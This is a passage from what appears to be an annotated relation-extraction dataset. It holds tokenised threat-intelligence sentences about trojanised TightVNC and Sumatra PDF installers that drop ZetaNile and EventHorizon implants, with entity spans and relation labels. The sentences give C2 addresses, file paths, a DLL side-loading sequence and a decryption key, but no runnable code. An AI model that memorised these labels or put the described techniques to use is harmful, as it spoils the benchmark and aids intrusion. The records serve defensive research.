18}, {"r": "RD", "evidence": [4], "h": 17, "t": 19}, {"r": "WR", "evidence": [4, 5], "h": 16, "t": 20}, {"r": "WR", "evidence": [4, 5], "h": 18, "t": 20}, {"r": "WR", "evidence": [4, 5], "h": 18, "t": 22}, {"r": "WR", "evidence": [5], "t": 22, "h": 24}, {"r": "RD", "evidence": [5], "t": 23, "h": 24}, {"r": "CO", "evidence": [5], "h": 20, "t": 23}, {"r": "RD", "evidence": [6], "h": 25, "t": 26}, {"r": "RD", "evidence": [6], "h": 25, "t": 27}, {"r": "ST", "evidence": [6], "h": 25, "t": 28}, {"r": "RD", "evidence": [6], "t": 27, "h": 29}, {"r": "FR", "evidence": [7], "h": 30, "t": 31}, {"r": "FR", "evidence": [7], "h": 30, "t": 32}]}, {"title": "054-14", "sents": [["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Upon", "being", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "sends", "the", "victim", "'s", "system", "hostname", "and", "device", "information", "to", "a", "C2", "communication", "server", "using", "custom", "encoding", "algorithms", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "have", "the", "ability", "to", "install", "extra", "malware", "onto", "compromised", "devices", "as", "required", "through", "the", "C2", "communication", "."], ["The", "version", "of", "muPDF/Subliminal", "Recording", "installer", "that", "is", "infected", "with", "backdoor", ",", "setup.exe", ",", "checks", "for", "the", "existence", "of", "file", "path", "ISSetupPrerequisites\\Setup64.exe", ",", "extracts", "an", "embedded", "executable", "within", "setup.exe", ",", "and", "writes", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", ".", "It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "PDBPath", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "executable file", "pos": [15, 17], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [19, 19], "name": "readme.txt", "pos": [19, 20], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "TightVNC Viewer", "pos": [2, 4], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "remote hosts", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "backdoor", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "malware", "pos": [28, 29], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [82, 82], "name": "44.238.74.84", "pos": [36, 37], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [101, 101], "name": "IP", "pos": [55, 56], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [113, 113], "name": "server IP", "pos": [67, 69], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [120, 120], "name": "DLL payload", "pos": [74, 76], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [123, 123], "name": "TightVNC.exe", "pos": [77, 78], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [141, 141], "name": "Sumatra PDF", "pos": [4, 6], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [163, 163], "name": "SecurePDF.exe", "pos": [26, 27], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [172, 172], "name": "ZetaNile implant", "pos": [35, 37], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [180, 180], "name": "themed file", "pos": [43, 45], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [189, 189], "name": "PDF", "pos": [2, 3], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [198, 198], "name": "decryption key", "pos": [11, 13], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [205, 205], "name": "payload", "pos": [18, 19], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [209, 209], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [218, 218], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [236, 236], "name": "malware", "pos": [9, 10], "index": "22_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [242, 242], "name": "hostname", "pos": [15, 16], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [244, 244], "name": "device information", "pos": [17, 19], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [248, 248], "name": "C2 communication server", "pos": [21, 24], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [259, 259], "name": "C2 check-in process", "pos": [32, 35], "index": "26_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [264, 264], "name": "attackers", "pos": [1, 2], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [271, 271], "name": "malware", "pos": [8, 9], "index": "28_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [279, 279], "name": "C2 communication", "pos": [16, 18], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [285, 285], "name": "muPDF/Subliminal Recording installer", "pos": [3, 6], "index": "30_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [294, 294], "name": "setup.exe", "pos": [12, 13], "index": "31_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [303, 303], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [21, 22], "index": "32_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [314, 314], "name": "C : \\colrctl\\colorui.dll", "pos": [32, 35], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [320, 320], "name": "It", "pos": [38, 39], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [323, 323], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [41, 44], "index": "35_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [327, 327], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [45, 48], "index": "36_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}, {"r": "ST", "evidence": [2], "t": 4, "h": 5}, {"r": "RF", "evidence": [2], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "h": 7, "t": 10}, {"r": "RF", "evidence": [2], "h": 7, "t": 10}, {"r": "RD", "evidence": [2], "h": 7, "t": 11}, {"r": "WR", "evidence": [2], "t": 11, "h": 12}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 7, "t": 22}, {"r": "RD", "evidence": [2, 3], "t": 11, "h": 13}, {"r": "FR", "evidence": [3], "h": 14, "t": 15}, {"r": "RD", "evidence": [3], "h": 14, "t": 16}, {"r": "WR", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 15, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 15, "t": 19}, {"r": "WR", "evidence": [4], "t": 19, "h": 21}, {"r": "RD", "evidence": [4], "t": 20, "h": 21}, {"r": "CO", "evidence": [4], "h": 17, "t": 20}, {"r": "RD", "evidence": [5], "h": 22, "t": 23}, {"r": "RD", "evidence": [5], "h": 22, "t": 24}, {"r": "ST", "evidence": [5], "h": 22, "t": 25}, {"r": "RD", "evidence": [5], "t": 24, "h": 26}, {"r": "FR", "evidence": [6], "h": 27, "t": 28}, {"r": "FR", "evidence": [6], "h": 27, "t": 29}, {"r": "FR", "evidence": [7], "h": 30, "t": 31}, {"r": "RD", "evidence": [7], "h": 30, "t": 32}, {"r": "WR", "evidence": [7], "h": 30, "t": 33}, {"r": "RD", "evidence": [7], "h": 34, "t": 35}, {"r": "WR", "evidence": [7], "h": 34, "t": 36}, {"r": "CO", "evidence": [7], "h": 31, "t": 34}]}, {"title": "054-15", "sents": [["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Upon", "being", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "sends", "the", "victim", "'s", "system", "hostname", "and", "device", "information", "to", "a", "C2", "communication", "server", "using", "custom", "encoding", "algorithms", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "have", "the", "ability", "to", "install", "extra", "malware", "onto", "compromised", "devices", "as", "required", "through", "the", "C2", "communication", "."], ["The", "version", "of", "muPDF/Subliminal", "Recording", "installer", "that", "is", "infected", "with", "backdoor", ",", "setup.exe", ",", "checks", "for", "the", "existence", "of", "file", "path", "ISSetupPrerequisites\\Setup64.exe", ",", "extracts", "an", "embedded", "executable", "within", "setup.exe", ",", "and", "writes", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", ".", "It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."], ["To", "execute", "the", "EventHorizon", "malware", "family", "'s", "colorui.dll", "as", "a", "second", "stage", "malware", ",", "the", "malicious", "installer", "creates", "a", "new", "process", "``", "C", ":", "\\colorctrl\\colorcpl.exe", "''", "with", "the", "decryption", "key", "argument", "C3A9B30B6A313F289297C9A36730DB6D", "passed", "on", "to", "colorui.dll", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "TightVNC Viewer", "pos": [2, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [27, 27], "name": "remote hosts", "pos": [9, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "backdoor", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "malware", "pos": [28, 29], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [54, 54], "name": "44.238.74.84", "pos": [36, 37], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [73, 73], "name": "IP", "pos": [55, 56], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [85, 85], "name": "server IP", "pos": [67, 69], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [92, 92], "name": "DLL payload", "pos": [74, 76], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [95, 95], "name": "TightVNC.exe", "pos": [77, 78], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [113, 113], "name": "Sumatra PDF", "pos": [4, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [135, 135], "name": "SecurePDF.exe", "pos": [26, 27], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [144, 144], "name": "ZetaNile implant", "pos": [35, 37], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [152, 152], "name": "themed file", "pos": [43, 45], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [161, 161], "name": "PDF", "pos": [2, 3], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [170, 170], "name": "decryption key", "pos": [11, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [177, 177], "name": "payload", "pos": [18, 19], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [181, 181], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [190, 190], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [208, 208], "name": "malware", "pos": [9, 10], "index": "19_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [214, 214], "name": "hostname", "pos": [15, 16], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [216, 216], "name": "device information", "pos": [17, 19], "index": "21_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [220, 220], "name": "C2 communication server", "pos": [21, 24], "index": "22_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [231, 231], "name": "C2 check-in process", "pos": [32, 35], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [236, 236], "name": "attackers", "pos": [1, 2], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [243, 243], "name": "malware", "pos": [8, 9], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [251, 251], "name": "C2 communication", "pos": [16, 18], "index": "26_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [257, 257], "name": "muPDF/Subliminal Recording installer", "pos": [3, 6], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [266, 266], "name": "setup.exe", "pos": [12, 13], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [275, 275], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [21, 22], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [286, 286], "name": "C : \\colrctl\\colorui.dll", "pos": [32, 35], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [292, 292], "name": "It", "pos": [38, 39], "index": "31_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [295, 295], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [41, 44], "index": "32_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [299, 299], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [45, 48], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [318, 318], "name": "malicious installer", "pos": [15, 17], "index": "34_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [325, 325], "name": "C : \\colorctrl\\colorcpl.exe", "pos": [22, 25], "index": "35_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [338, 338], "name": "colorui.dll", "pos": [35, 36], "index": "36_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 0, "t": 1}, {"r": "RF", "evidence": [1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 0, "t": 2}, {"r": "ST", "evidence": [1], "t": 1, "h": 2}, {"r": "RF", "evidence": [1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 4, "t": 7}, {"r": "RF", "evidence": [1], "h": 4, "t": 7}, {"r": "RD", "evidence": [1], "h": 4, "t": 8}, {"r": "WR", "evidence": [1], "t": 8, "h": 9}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 19}, {"r": "RD", "evidence": [1, 2], "t": 8, "h": 10}, {"r": "FR", "evidence": [2], "h": 11, "t": 12}, {"r": "RD", "evidence": [2], "h": 11, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 10, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 12, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 12, "t": 16}, {"r": "WR", "evidence": [3], "t": 16, "h": 18}, {"r": "RD", "evidence": [3], "t": 17, "h": 18}, {"r": "CO", "evidence": [3], "h": 14, "t": 17}, {"r": "RD", "evidence": [4], "h": 19, "t": 20}, {"r": "RD", "evidence": [4], "h": 19, "t": 21}, {"r": "ST", "evidence": [4], "h": 19, "t": 22}, {"r": "RD", "evidence": [4], "t": 21, "h": 23}, {"r": "FR", "evidence": [5], "h": 24, "t": 25}, {"r": "FR", "evidence": [5], "h": 24, "t": 26}, {"r": "FR", "evidence": [6], "h": 27, "t": 28}, {"r": "RD", "evidence": [6], "h": 27, "t": 29}, {"r": "WR", "evidence": [6], "h": 27, "t": 30}, {"r": "RD", "evidence": [6], "h": 31, "t": 32}, {"r": "WR", "evidence": [6], "h": 31, "t": 33}, {"r": "CO", "evidence": [6], "h": 28, "t": 31}, {"r": "FR", "evidence": [7], "h": 34, "t": 35}, {"r": "WR", "evidence": [7], "h": 34, "t": 36}]}, {"title": "054-16", "sents": [["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Upon", "being", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "sends", "the", "victim", "'s", "system", "hostname", "and", "device", "information", "to", "a", "C2", "communication", "server", "using", "custom", "encoding", "algorithms", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "have", "the", "ability", "to", "install", "extra", "malware", "onto", "compromised", "devices", "as", "required", "through", "the", "C2", "communication", "."], ["The", "version", "of", "muPDF/Subliminal", "Recording", "installer", "that", "is", "infected", "with", "backdoor", ",", "setup.exe", ",", "checks", "for", "the", "existence", "of", "file", "path", "ISSetupPrerequisites\\Setup64.exe", ",", "extracts", "an", "embedded", "executable", "within", "setup.exe", ",", "and", "writes", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", ".", "It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."], ["To", "execute", "the", "EventHorizon", "malware", "family", "'s", "colorui.dll", "as", "a", "second", "stage", "malware", ",", "the", "malicious", "installer", "creates", "a", "new", "process", "``", "C", ":", "\\colorctrl\\colorcpl.exe", "''", "with", "the", "decryption", "key", "argument", "C3A9B30B6A313F289297C9A36730DB6D", "passed", "on", "to", "colorui.dll", "."], ["During", "the", "victim", "check-in", "process", ",", "the", "colorui.dll", "DLL", "is", "injected", "into", "C", ":", "\\Windows\\System\\credwiz.exe", "or", "iexpress.exe", ",", "and", "it", "sends", "C2", "HTTP", "requests", "to", "receive", "an", "additional", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "TightVNC Viewer", "pos": [2, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "remote hosts", "pos": [9, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "backdoor", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [28, 28], "name": "malware", "pos": [28, 29], "index": "4_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [36, 36], "name": "44.238.74.84", "pos": [36, 37], "index": "5_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [55, 55], "name": "IP", "pos": [55, 56], "index": "6_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [67, 67], "name": "server IP", "pos": [67, 69], "index": "7_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [74, 74], "name": "DLL payload", "pos": [74, 76], "index": "8_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [77, 77], "name": "TightVNC.exe", "pos": [77, 78], "index": "9_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [95, 95], "name": "Sumatra PDF", "pos": [4, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [117, 117], "name": "SecurePDF.exe", "pos": [26, 27], "index": "11_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [126, 126], "name": "ZetaNile implant", "pos": [35, 37], "index": "12_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [134, 134], "name": "themed file", "pos": [43, 45], "index": "13_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [143, 143], "name": "PDF", "pos": [2, 3], "index": "14_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [152, 152], "name": "decryption key", "pos": [11, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [159, 159], "name": "payload", "pos": [18, 19], "index": "16_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [163, 163], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [172, 172], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "18_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [190, 190], "name": "malware", "pos": [9, 10], "index": "19_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [196, 196], "name": "hostname", "pos": [15, 16], "index": "20_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [198, 198], "name": "device information", "pos": [17, 19], "index": "21_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [202, 202], "name": "C2 communication server", "pos": [21, 24], "index": "22_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [213, 213], "name": "C2 check-in process", "pos": [32, 35], "index": "23_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [218, 218], "name": "attackers", "pos": [1, 2], "index": "24_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [225, 225], "name": "malware", "pos": [8, 9], "index": "25_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [233, 233], "name": "C2 communication", "pos": [16, 18], "index": "26_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [239, 239], "name": "muPDF/Subliminal Recording installer", "pos": [3, 6], "index": "27_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [248, 248], "name": "setup.exe", "pos": [12, 13], "index": "28_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [257, 257], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [21, 22], "index": "29_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [268, 268], "name": "C : \\colrctl\\colorui.dll", "pos": [32, 35], "index": "30_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [274, 274], "name": "It", "pos": [38, 39], "index": "31_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [277, 277], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [41, 44], "index": "32_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [281, 281], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [45, 48], "index": "33_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [300, 300], "name": "malicious installer", "pos": [15, 17], "index": "34_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [307, 307], "name": "C : \\colorctrl\\colorcpl.exe", "pos": [22, 25], "index": "35_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [320, 320], "name": "colorui.dll", "pos": [35, 36], "index": "36_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [329, 329], "name": "colorui.dll", "pos": [7, 8], "index": "37_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [334, 334], "name": "C : \\Windows\\System\\credwiz.exe", "pos": [12, 15], "index": "38_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [338, 338], "name": "iexpress.exe", "pos": [16, 17], "index": "39_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [350, 350], "name": "payload", "pos": [28, 29], "index": "40_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "ST", "evidence": [0], "h": 4, "t": 5}, {"r": "RF", "evidence": [0], "h": 4, "t": 5}, {"r": "ST", "evidence": [0], "h": 4, "t": 6}, {"r": "RF", "evidence": [0], "h": 4, "t": 6}, {"r": "ST", "evidence": [0], "h": 4, "t": 7}, {"r": "RF", "evidence": [0], "h": 4, "t": 7}, {"r": "RD", "evidence": [0], "h": 4, "t": 8}, {"r": "WR", "evidence": [0], "t": 8, "h": 9}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 4, "t": 19}, {"r": "RD", "evidence": [0, 1], "t": 8, "h": 10}, {"r": "FR", "evidence": [1], "h": 11, "t": 12}, {"r": "RD", "evidence": [1], "h": 11, "t": 13}, {"r": "WR", "evidence": [1, 2], "h": 10, "t": 14}, {"r": "WR", "evidence": [1, 2], "h": 12, "t": 14}, {"r": "WR", "evidence": [1, 2], "h": 12, "t": 16}, {"r": "WR", "evidence": [2], "t": 16, "h": 18}, {"r": "RD", "evidence": [2], "t": 17, "h": 18}, {"r": "CO", "evidence": [2], "h": 14, "t": 17}, 